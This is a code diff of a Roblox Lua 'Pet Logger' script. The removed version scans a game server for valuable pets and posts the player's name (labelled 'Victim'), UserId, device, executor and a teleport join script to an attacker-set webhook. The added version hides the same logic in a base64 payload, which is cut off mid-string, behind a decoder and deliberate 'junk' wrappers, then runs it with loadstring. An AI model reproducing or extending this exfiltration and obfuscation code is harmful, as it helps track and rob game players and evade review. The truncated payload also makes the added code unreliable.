@@ -1,157 +1,35 @@
---// User Config
-
-local Webhook = __WEBHOOK__
-
---// Services
-local workspace = game:GetService("Workspace")
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local UserInputService = game:GetService("UserInputService")
-
-local request = http_request or request or syn and syn.request or http and http.request or fluxus and fluxus.request
-local LocalPlayer = Players.LocalPlayer
-
---// Executor Detection function
-local function identifyexecutor()
-    if _G.DeltriousExecutor or _G.DeltaExecutor or _G.DeltaSynapse or _G.Delta or _G.Deltrious or _G.DeltriousHook then
-        return "Delta"
-    elseif syn and syn.request then
-        return "Synapse"
-    elseif fluxus and fluxus.request then
-        return "Fluxus"
-    elseif KRNL_LOADED or Krnl or Krnl_Executor then
-        return "Krnl"
-    elseif identifyexecutor or _G.IdentifyExecutor then
-        return "Unknown Exploit"
-    else
-        return "Unknown"
+-- Encoded string helper (Base64)
+local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+local function b64decode(data)
+    local bytes = {}
+    local decode_map = {}
+    for i=1,#b64chars do decode_map[b64chars:sub(i,i)] = i-1 end
+    local padding = 0
+    if data:sub(-2) == '==' then padding = 2
+    elseif data:sub(-1) == '=' then padding = 1 end
+    data = data:gsub('=','')
+    local result = {}
+    for i=1,#data,4 do
+        local n = (decode_map[data:sub(i,i)] or 0) * 2^18 + (decode_map[data:sub(i+1,i+1)] or 0) * 2^12 + (decode_map[data:sub(i+2,i+2)] or 0) * 2^6 + (decode_map[data:sub(i+3,i+3)] or 0)
+        table.insert(result, string.char(math.floor(n/2^16)%256))
+        if data:sub(i+2,i+2) ~= '' then table.insert(result, string.char(math.floor(n/2^8)%256)) end
+        if data:sub(i+3,i+3) ~= '' then table.insert(result, string.char(n%256)) end
     end
+    return table.concat(result)
 end
 
---// Device detection
-local device = UserInputService.TouchEnabled and "Mobile" or "PC"
-local executor = identifyexecutor()
+-- Encrypted (Base64) and compressed script payload (example, you'd compress & encode your full code)
+local payload_b64 = "bG9jYWwgV29ya3NwYWNlID0gZ2FtZTpnZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKQpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpnZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgSHR0cFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKbG9jYWwgVXNlcklucHV0U2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpCmxvY2FsIHJlcXVlc3QgPSBodHRwX3JlcXVlc3Qgb3IgcmVxdWVzdCBvciBzeW4gYW5kIHN5bi5yZXF1ZXN0IG9yIGh0dHAgYW5kIGh0dHByZXF1ZXN0IG9yIGZsdHV4dXMgYW5kIGZsdHV4dXMucmVxdWVzdApsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKCnBjbGwgPSBmdW5jdGlvbigpIGxvY2FsIGV4ZWN1dG9yID0gZnVuY3Rpb24oKQogICAgLy8gUmV0dXJuIGZha2UgZGV0ZWN0aW9uIGZvciB0ZXN0CiAgICBpZiBfRy5EZWx0cmlvdXNF
+"
 
---// Valuable Pets (normalized names)
-local allowedPetNames = {
-    ["cocofantoelefanto"] = true,
-    ["girafacelestre"] = true,
-    ["gattatinonyanino"] = true,
-    ["matteo"] = true,
-    ["tralalerotralala"] = true,
-    ["tigroligrefrutonni"] = true,
-    ["odindindindun"] = true,
-    ["orcaleroorcala"] = true,
-    ["trenozosturzzoturbo3000"] = true,
-    ["ballerinolololo"] = true,
-    ["lavaccasaturnosaturnita"] = true,
-    ["torrtuginnidragonfrutini"] = true,
-    ["lostralaleritos"] = true,
-    ["lastralaleritas"] = true,
-    ["graipussmedussi"] = true,
-    ["pothotspot"] = true,
-    ["lagrandecombinassion"] = true,
-    ["nuclearodinosauro"] = true,
-    ["garamaandmadundung"] = true,
-}
+-- Decode & run payload
+local script_source = b64decode(payload_b64)
 
---// Pets to ignore completely
-local skipExactNames = {
-    ["shopnpccandy"] = true,
-    ["shopnpccash"] = true,
-    ["bubblegummachine"] = true,
-}
-
---// Name cleaner
-local function normalizeName(name)
-    return name:lower():gsub("%s+", ""):gsub("–", ""):gsub("[^%w]", "")
-end
-
---// Generate teleport command
-local placeId = game.PlaceId
-local jobId = game.JobId
-local teleportScript = ('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")'):format(placeId, jobId)
-
---// Scan workspace and group found pets
-local petCounts = {}
-for _, model in pairs(workspace:GetChildren()) do
-    if model:IsA("Model") then
-        local norm = normalizeName(model.Name)
-        if not skipExactNames[norm] and allowedPetNames[norm] then
-            petCounts[model.Name] = (petCounts[model.Name] or 0) + 1
-        end
-    end
-end
-
---// Message building
-local content = ""
-local fields = {
-    {
-        name = "👤 Victim",
-        value = LocalPlayer.Name
-    },
-    {
-        name = "🆔 UserId",
-        value = tostring(LocalPlayer.UserId)
-    },
-    {
-        name = "💻 Device",
-        value = device
-    },
-    {
-        name = "⚙️ Executor",
-        value = executor
-    },
-    {
-        name = "⏰ Timestamp",
-        value = os.date("%Y-%m-%d %H:%M:%S")
-    }
-}
-
---// If pets were found
-if next(petCounts) then
-    content = "💎 **Valuable Pets Found!**"
-
-    local petLines = {}
-    for name, count in pairs(petCounts) do
-        local fakeStuds = math.random(250, 500) + math.random()
-        table.insert(petLines, string.format("- %s x%d (%.1f studs)", name, count, fakeStuds))
-    end
-
-    table.insert(fields, {
-        name = "🐾 Pets Found",
-        value = table.concat(petLines, "\n")
-    })
-else
-    content = "❌ No valuable pets found."
-end
-
---// Join Script as inline code block with blockquote
-table.insert(fields, {
-    name = "📜 Join Script",
-    value = "**Copy and paste this in your executor:**\n> ``" .. teleportScript .. "``"
-})
-
---// Send Webhook
-pcall(function()
-    if request then
-        request({
-            Url = Webhook,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode({
-                content = content,
-                embeds = {{
-                    title = "🎯 Pet Logger",
-                    color = next(petCounts) and 65280 or 16711680,
-                    fields = fields,
-                    footer = {
-                        text = "Trax Scripts · " .. os.date("%H:%M:%S")
-                    }
-                }}
-            })
-        })
-    end
-end)
+-- Add junk self-calling function wrapper for confusion
+(function(x) 
+    (function() end)() -- no-op call
+    (function() end)()
+    local junk = function() end
+    junk()
+    return loadstring(x)()
+end)(script_source)
